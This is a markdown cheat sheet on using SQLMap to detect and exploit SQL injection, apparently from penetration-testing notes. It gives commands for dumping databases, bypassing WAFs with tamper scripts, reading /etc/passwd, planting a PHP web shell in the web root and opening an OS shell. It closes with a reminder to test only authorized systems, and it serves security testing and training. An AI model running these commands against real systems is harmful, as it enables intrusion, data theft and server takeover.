# SQLMap

SQLMap automates finding and exploiting **SQL injection**. It detects the injection type, fingerprints the DBMS, and can enumerate databases, dump data, read/write files, and even get an OS shell - all from the command line. It's the go-to tool once you suspect a parameter is injectable (see [SQL Injection](../Vulnerabilities/SQL%20Injection.md)).

## Install

```bash
sudo apt install sqlmap        # or: pip install sqlmap
```

## Basic targeting

```bash
# GET parameter
sqlmap -u "http://target.tld/item?id=1"

# POST data
sqlmap -u "http://target.tld/login" --data "user=a&pass=b"

# Test a specific parameter only
sqlmap -u "http://target.tld/item?id=1&cat=2" -p id

# From a saved Burp request (easiest - keeps cookies/headers)
sqlmap -r request.txt

# With auth cookie / headers
sqlmap -u "..." --cookie="session=abc" --headers="X-API-Key: k"
```

## Enumeration (the usual flow)

```bash
sqlmap -r req.txt --dbs                        # list databases
sqlmap -r req.txt -D shopdb --tables           # list tables
sqlmap -r req.txt -D shopdb -T users --columns # list columns
sqlmap -r req.txt -D shopdb -T users --dump    # dump the table
sqlmap -r req.txt --dump-all                   # everything (noisy)
sqlmap -r req.txt --current-user --current-db --is-dba   # context/privs
```

## Tuning detection

```bash
sqlmap -r req.txt --level=5 --risk=3   # deeper tests (more payloads)
sqlmap -r req.txt --technique=BEUSTQ   # B=boolean E=error U=union S=stacked T=time Q=inline
sqlmap -r req.txt --dbms=mysql         # skip fingerprinting if known
sqlmap -r req.txt --batch              # non-interactive (accept defaults)
sqlmap -r req.txt --threads=10         # parallelism
```

## WAF bypass (tamper scripts)

```bash
sqlmap -r req.txt --tamper=space2comment,between,charencode --random-agent
sqlmap --list-tampers          # see all tamper scripts
```

## Going beyond data (post-exploitation)

```bash
sqlmap -r req.txt --file-read=/etc/passwd          # read a server file
sqlmap -r req.txt --file-write=shell.php --file-dest=/var/www/html/shell.php
sqlmap -r req.txt --os-shell                       # interactive OS shell (if possible)
sqlmap -r req.txt --sql-shell                      # interactive SQL prompt
```

## Practical tips

- Prefer `-r request.txt` from Burp - it captures cookies, headers, and method automatically.
- Start low (`--level 1 --risk 1`), raise only if nothing is found.
- Use `--batch` for automation, but review results manually.
- Mark the injection point with `*` in a saved request for custom placement.
- **Only test systems you're authorized to.** SQLMap is loud and can modify data.

## Resources

- [SQLMap wiki](https://github.com/sqlmapproject/sqlmap/wiki)
